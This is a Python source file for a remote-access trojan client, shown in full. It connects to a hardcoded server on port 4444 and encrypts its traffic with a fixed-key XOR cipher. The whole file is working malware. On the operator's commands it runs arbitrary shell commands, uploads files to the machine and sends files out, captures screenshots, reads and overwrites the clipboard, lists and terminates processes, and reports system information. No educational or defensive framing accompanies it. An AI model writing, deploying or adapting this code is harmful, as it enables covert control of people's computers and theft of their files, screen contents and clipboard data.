import socket
import json
import base64
import subprocess
import threading
import sys
import os
import platform
import psutil
import pyperclip
from PIL import ImageGrab
import io

# === Encryption helpers (XOR cipher must match server) ===
def xor_crypt(data, key='mysecretkey'):
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

def send_data(sock, data):
    json_data = json.dumps(data).encode()
    encrypted = xor_crypt(json_data)
    length = len(encrypted)
    sock.sendall(length.to_bytes(4, 'big') + encrypted)

def recv_data(sock):
    raw_length = sock.recv(4)
    if not raw_length:
        return None
    length = int.from_bytes(raw_length, 'big')
    encrypted = b''
    while len(encrypted) < length:
        packet = sock.recv(length - len(encrypted))
        if not packet:
            return None
        encrypted += packet
    decrypted = xor_crypt(encrypted)
    return json.loads(decrypted.decode())

# === Command implementations ===
def execute_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        return str(e)

def list_processes():
    procs = []
    for proc in psutil.process_iter(['pid', 'name']):
        procs.append(f"{proc.info['pid']}: {proc.info['name']}")
    return "\n".join(procs)

def kill_process(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        return f"Process {pid} terminated"
    except Exception as e:
        return str(e)

def get_clipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        return str(e)

def set_clipboard(data):
    try:
        pyperclip.copy(data)
        return "Clipboard updated"
    except Exception as e:
        return str(e)

def system_info():
    return {
        "hostname": platform.node(),
        "platform": platform.system(),
        "platform-release": platform.release(),
        "platform-version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
    }

def screenshot_b64():
    screenshot = ImageGrab.grab()
    buf = io.BytesIO()
    screenshot.save(buf, format='PNG')
    return base64.b64encode(buf.getvalue()).decode()

# === Client main loop ===
def client_main(server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))

    try:
        while True:
            command = recv_data(sock)
            if command is None or command.get('action') == 'exit':
                break

            action = command.get('action')

            if action == 'exec':
                cmd = command.get('command')
                output = execute_command(cmd)
                send_data(sock, {'result': output})

            elif action == 'upload':
                filename = command.get('filename')
                filedata = base64.b64decode(command.get('data'))
                with open(filename, 'wb') as f:
                    f.write(filedata)
                send_data(sock, {'result': f'Uploaded {filename}'})

            elif action == 'download':
                filename = command.get('filename')
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        filedata = base64.b64encode(f.read()).decode()
                    send_data(sock, {'result': filedata})
                else:
                    send_data(sock, {'result': 'File not found'})

            elif action == 'screenshot':
                try:
                    b64screenshot = screenshot_b64()
                    send_data(sock, {'result': b64screenshot})
                except Exception as e:
                    send_data(sock, {'result': str(e)})

            elif action == 'list_processes':
                output = list_processes()
                send_data(sock, {'result': output})

            elif action == 'kill_process':
                pid = int(command.get('pid'))
                output = kill_process(pid)
                send_data(sock, {'result': output})

            elif action == 'clipboard_get':
                output = get_clipboard()
                send_data(sock, {'result': output})

            elif action == 'clipboard_set':
                data = command.get('data')
                output = set_clipboard(data)
                send_data(sock, {'result': output})

            elif action == 'sysinfo':
                info = system_info()
                send_data(sock, {'result': info})

            else:
                send_data(sock, {'result': 'Unknown command'})

    except Exception as e:
        sock.close()

if __name__ == '__main__':
    # Change IP and port to match your server
    SERVER_IP = '192.168.40.251'
    SERVER_PORT = 4444
    client_main(SERVER_IP, SERVER_PORT)
